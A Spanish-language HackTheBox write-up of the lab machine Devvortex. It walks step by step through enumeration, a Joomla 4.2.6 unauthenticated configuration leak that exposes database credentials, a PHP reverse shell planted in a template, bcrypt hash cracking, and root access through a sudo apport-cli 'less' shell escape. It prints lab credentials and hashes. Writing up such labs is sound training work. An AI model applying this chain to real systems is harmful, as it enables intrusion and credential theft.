---
title: Devvortex - HTB
date: 2026-05-03
mermaid: true
categories: [HackTheBox, Linux, Easy]
image: 
  path: /assets/images/htb/devvortex/logo.png
tags: [Information Disclosure, Joomla, apport-cli]
---

---

## Enumeration
Vamos a empezar con un escaneo `nmap`:

```bash
[May 02, 2026 - 20:11:18 (CEST)] exegol-htb Devvortex # nmap -p- --open -sS -n -Pn 10.129.30.218 -vvv
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-02 20:11 CEST
Initiating SYN Stealth Scan at 20:11
Scanning 10.129.30.218 [65535 ports]
Discovered open port 80/tcp on 10.129.30.218
Discovered open port 22/tcp on 10.129.30.218
Completed SYN Stealth Scan at 20:11, 17.23s elapsed (65535 total ports)
Nmap scan report for 10.129.30.218
Host is up, received user-set (0.044s latency).
Scanned at 2026-05-02 20:11:19 CEST for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
           Raw packets sent: 65862 (2.898MB) | Rcvd: 65535 (2.621MB)
```

Vamos a realizar un segundo escaneo para ver que versiones de los servicios están corriendo:

```bash
[May 02, 2026 - 20:12:15 (CEST)] exegol-htb Devvortex # nmap -p22,80 -sCV 10.129.30.218              
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-02 20:12 CEST
Nmap scan report for 10.129.30.218
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
```

Vemos que tiene un dominio configurado vamos a añadirlo al `/etc/hosts`:

```
10.129.30.218 devvortex.htb
```

### devvortex.htb - TCP 80

![](/assets/images/htb/devvortex/1.png)

Vamos a ver que tecnologías que emplea:

```bash
[May 02, 2026 - 20:18:11 (CEST)] exegol-htb Devvortex # whatweb http://devvortex.htb
http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.30.218], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Vamos a hacer fuzzing de directorios y archivos:

```bash
[May 02, 2026 - 20:15:40 (CEST)] exegol-htb Devvortex # ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -u "http://devvortex.htb/FUZZ" -e .php,.html,.css,.js,.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .php .html .css .js .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
index.html              [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 46ms]
                        [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 46ms]
contact.html            [Status: 200, Size: 8884, Words: 3156, Lines: 290, Duration: 46ms]
about.html              [Status: 200, Size: 7388, Words: 2258, Lines: 232, Duration: 46ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
do.html                 [Status: 200, Size: 7603, Words: 2436, Lines: 255, Duration: 51ms]
portfolio.html          [Status: 200, Size: 6845, Words: 2083, Lines: 230, Duration: 44ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 45ms]
```

No encontramos gran cosa aquí, vamos a hacer fuzzing de subdominios:

```bash
[May 02, 2026 - 20:17:00 (CEST)] exegol-htb Devvortex # ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ic -u "http://10.129.30.218" -H 'Host: FUZZ.devvortex.htb' -c -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.30.218
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 9907ms]
```

Vamos a añadir el subdominio al `/etc/hosts`:

```
10.129.30.218 devvortex.htb dev.devvortex.htb
```

### dev.devvortex.htb

![](/assets/images/htb/devvortex/2.png)

#### whatweb
Vemos a ver que tecnología emplean en el subdominio:

```bash
[May 02, 2026 - 20:22:30 (CEST)] exegol-htb Devvortex # whatweb http://dev.devvortex.htb/                    
http://dev.devvortex.htb/ [200 OK] Bootstrap, Cookies[1daf6e3366587cf9ab315f8ef3b5ed78], Country[RESERVED][ZZ], Email[contact@devvortex.htb,contact@example.com,info@Devvortex.htb,info@devvortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[1daf6e3366587cf9ab315f8ef3b5ed78], IP[10.129.30.218], Lightbox, Script, Title[Devvortex], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], nginx[1.18.0]
```

Vamos a hacer fuzzing:

```bash
[May 02, 2026 - 20:24:41 (CEST)] exegol-htb Devvortex # ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -u "http://dev.devvortex.htb/FUZZ" -e .php,.html,.css,.js,.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .php .html .css .js .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
.css                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 44ms]
.html                   [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 44ms]
.js                     [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 44ms]
.txt                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 45ms]
index.php               [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 385ms]
                        [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 449ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 429ms]
media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 162ms]
templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 119ms]
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 46ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 153ms]
README.txt              [Status: 200, Size: 4942, Words: 480, Lines: 75, Duration: 45ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 136ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
robots.txt              [Status: 200, Size: 764, Words: 78, Lines: 30, Duration: 123ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 143ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 97ms]
```

Vemos varias cosas interesantes, vamos poco a poco.

#### robots.txt
![](/assets/images/htb/devvortex/3.png)

#### Joomla Enumeration

##### joomla.xml
Vamos a intentar leer el `joomla.xml` ya que contiene información como la versión exacta instalada:

```bash
[May 02, 2026 - 20:53:16 (CEST)] exegol-htb Devvortex # curl -s -X GET 'http://dev.devvortex.htb/administrator/manifests/files/joomla.xml'
<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
	<name>files_joomla</name>
	<author>Joomla! Project</author>
	<authorEmail>admin@joomla.org</authorEmail>
	<authorUrl>www.joomla.org</authorUrl>
	<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
	<version>4.2.6</version>
	<creationDate>2022-12</creationDate>
	<description>FILES_JOOMLA_XML_DESCRIPTION</description>

	<scriptfile>administrator/components/com_admin/script.php</scriptfile>

	<update>
		<schemas>
			<schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
			<schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
		</schemas>
	</update>

	<fileset>
		<files>
			<folder>administrator</folder>
			<folder>api</folder>
			<folder>cache</folder>
			<folder>cli</folder>
			<folder>components</folder>
			<folder>images</folder>
			<folder>includes</folder>
			<folder>language</folder>
			<folder>layouts</folder>
			<folder>libraries</folder>
			<folder>media</folder>
			<folder>modules</folder>
			<folder>plugins</folder>
			<folder>templates</folder>
			<folder>tmp</folder>
			<file>htaccess.txt</file>
			<file>web.config.txt</file>
			<file>LICENSE.txt</file>
			<file>README.txt</file>
			<file>index.php</file>
		</files>
	</fileset>

	<updateservers>
		<server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
	</updateservers>
</extension>
```

Vemos que esta empleando la versión de Joomla `4.2.6`. Vamos a buscar algún fallo de seguridad:

![](/assets/images/htb/devvortex/4.png)

Vemos que es vulnerable a un `unauthenticated information disclosure`, si vemos su exploit veremos que apuntan a las siguientes rutas:

```
api/index.php/v1/config/application?public=true
```

## Shell as www-data

Vamos a ver que información muestra:

```bash
[May 02, 2026 - 21:14:50 (CEST)] exegol-htb Devvortex # curl -s -X GET 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true",
    "next": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "display_offline_message": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_image": "",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "sitename": "Development",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "editor": "tinymce",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "captcha": "0",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "list_limit": 20,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "access": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang_const": true,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "sd4fg_",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbencryption": 0,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbsslverifyservercert": false,
        "id": 224
      }
    }
  ],
  "meta": {
    "total-pages": 4
  }
}
```

Vemos unas credenciales y un usuario llamado `lewis`.  Vamos a probar si esa contraseña la reutiliza un usuario administrativo de Joomla:

![](/assets/images/htb/devvortex/5.png)
![](/assets/images/htb/devvortex/6.png)

Vemos que no, vamos a probar `lewis`:

![](/assets/images/htb/devvortex/7.png)

Vemos que `lewis` si es un usuario válido en el panel de Joomla.

Vamos a intentar editar un template:

![](/assets/images/htb/devvortex/8.png)

Vale ahora editaré cual sea y lo intercambiaré por una [PHP Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell):

![](/assets/images/htb/devvortex/9.png)

Vemos que nos dan la ruta del archivo donde está ubicado que en este caso esta en `/templates/cassiopeia/error.php`.

Vamos a ponernos en escucha:

```bash
[May 02, 2026 - 21:18:36 (CEST)] exegol-htb Devvortex # nc -nvlp 9001                  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Ahora accederemos al archivo:

![](/assets/images/htb/devvortex/10.png)

Vemos que se queda cargando, si vemos `nc`:

```bash
[May 02, 2026 - 21:18:36 (CEST)] exegol-htb Devvortex # nc -nvlp 9001                  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.30.218.
Ncat: Connection from 10.129.30.218:49102.
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 19:19:53 up  1:11,  0 users,  load average: 0.01, 0.04, 0.60
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:/$
```
## Shell as logan

Vamos a enumerar los usuarios existentes en el sistema, para ello leeremos el `/etc/passwd`:

```bash
www-data@devvortex:/$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
logan:x:1000:1000:,,,:/home/logan:/bin/bash
```

Vemos que existe el usuario `logan`, podríamos probar reutilización de credenciales:

```bash
www-data@devvortex:/$ su logan
Password: 
su: Authentication failure
```

Vemos que no. 

### MySQL Enumeration

Vamos a probar las credenciales de `lewis` para acceder a la base de datos `MySQL`:

```bash
www-data@devvortex:~/dev.devvortex.htb$ mysql -ulewis -pP4ntherg0t1n5r3c0n##
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 31
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Vamos a listar las bases de datos existentes:

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> 
```

Vamos a listar las tablas de la base de datos `joomla`:

```bash
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)
```

La que más me llama la atención es `sd4fg_users` , vamos a leer todas las columnas de la tabla:

```bash
mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2026-05-03 08:12:56 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.01 sec)
```

Obtenemos la contraseña hasheada de `logan`, vamos a detectar el tipo de hash que es:

![](/assets/images/htb/devvortex/11.png)

### Brute Force logan hash

Vemos que el posible algoritmo es `bcrypt`, ahora usaremos `john` para hacer fuerza bruta indicando el formato:

```bash
[May 03, 2026 - 10:24:22 (CEST)] exegol-htb Devvortex # john -w=/usr/share/wordlists/rockyou.txt logan_hash --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:03 DONE (2026-05-03 10:24) 0.3077g/s 432.0p/s 432.0c/s 432.0C/s winston..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Vamos a probar la contraseña por SSH:

```bash
[May 03, 2026 - 10:24:52 (CEST)] exegol-htb Devvortex # sshpass -p 'tequieromucho' ssh logan@devvortex.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 03 May 2026 08:24:53 AM UTC

  System load:  0.01              Processes:             167
  Usage of /:   63.5% of 4.76GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.129.229.146
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ cat user.txt 
c5670f8829afea213bb9a8fc9c07afd6
```

## Shell as root

Si enumeramos los permisos SUDOER:
```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
Vemos que podemos usar `apport-cli` como cualquier usuario del sistema. 

Investigando encuentro que hay una posibilidad de escalada de privilegios mediante este archivo. Ya que en un momento del programa emplea `less` y eso nos permitirá ejecutar un comando como el usuario que haya ejecutado `apport-cli`.

Para ello primero necesitaremos generar un archivo `.crash` para ello:
```bash
logan@devvortex:~$ sudo -u root /usr/bin/apport-cli 

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (30.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): 
```
Seleccionaremos `S`. Y una vez finalice si vemos el directorio `/var/crash/`:

```bash
logan@devvortex:~$ ls /var/crash/
_usr_bin_apport-cli.0.crash  _usr_bin_apport-cli.0.upload
```

Ahora ejecutaremos `apport-cli` indicando este archivo `.crash`:
```bash
logan@devvortex:~$ sudo -u root /usr/bin/apport-cli /var/crash/_usr_bin_apport-cli.0.crash 

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (30.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): 
```

Seleccionaremos `V` ya que nos mostrará la vista con `less`:

![](/assets/images/htb/devvortex/12.png)

Ahora simplemente poniendo `!/bin/bash` estaremos como `root`:

```bash
root@devvortex:/home/logan# whoami
root
```

## Extra
### Users enuemration Joomla - Information Disclosure

Otro endpoint que podíamos emplear es `/api/index.php/v1/users?public=true` donde nos dará todos los usuarios existentes:
```bash
[May 03, 2026 - 10:35:10 (CEST)] exegol-htb /workspace # curl -s -X GET 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/users?public=true"
  },
  "data": [
    {
      "type": "users",
      "id": "649",
      "attributes": {
        "id": 649,
        "name": "lewis",
        "username": "lewis",
        "email": "lewis@devvortex.htb",
        "block": 0,
        "sendEmail": 1,
        "registerDate": "2023-09-25 16:44:24",
        "lastvisitDate": "2026-05-03 08:12:56",
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Super Users"
      }
    },
    {
      "type": "users",
      "id": "650",
      "attributes": {
        "id": 650,
        "name": "logan paul",
        "username": "logan",
        "email": "logan@devvortex.htb",
        "block": 0,
        "sendEmail": 0,
        "registerDate": "2023-09-26 19:15:42",
        "lastvisitDate": null,
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Registered"
      }
    }
  ],
  "meta": {
    "total-pages": 1
  }
}
```
-- -
